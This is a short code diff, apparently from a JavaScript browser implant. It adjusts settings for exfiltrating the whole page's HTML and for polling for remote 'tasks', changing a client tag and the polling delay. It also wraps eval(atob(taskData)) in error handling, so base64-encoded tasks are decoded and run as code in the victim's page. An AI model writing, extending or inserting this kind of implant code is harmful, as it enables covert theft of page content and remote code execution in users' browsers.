@@ -113,7 +113,7 @@ function initGlobals()
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "oc1";
+	window.taperTag = "testTag";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -134,7 +134,7 @@ function initGlobals()
 
 	// Should we check for tasks? How often?
 	window.taperTaskCheck      = true;
-	window.taperTaskCheckDelay = 1000;
+	window.taperTaskCheckDelay = 10000;
 	window.taperTaskIntervalID = "";
 
 
@@ -990,7 +990,14 @@ async function checkTasks()
 
 		// console.log("Got task: " + taskData);
 
-		eval(atob(taskData));
+		try
+		{
+			eval(atob(taskData));
+		}
+		catch (error)
+		{
+			console.log('Error running task ' + taskId);
+		}
 	}
 }
 
